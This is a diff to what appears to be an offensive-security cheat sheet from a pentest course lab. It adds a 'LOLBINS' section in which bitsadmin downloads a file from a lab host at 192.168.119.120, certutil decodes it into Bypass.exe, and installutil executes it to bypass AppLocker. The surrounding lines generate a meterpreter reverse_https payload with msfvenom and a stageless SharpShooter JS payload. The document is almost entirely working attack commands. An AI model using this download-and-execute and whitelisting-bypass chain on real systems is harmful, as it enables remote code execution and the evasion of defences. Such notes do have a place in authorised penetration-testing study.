@@ -35,6 +35,15 @@ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPO
 └─$ sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
 
 ```
+# LOLBINS
+## File download and applocker bypass exe
+
+```
+bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt
+certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe
+del C:\users\student\enc.txt
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
+```
 
 # AV
 ## Find signature
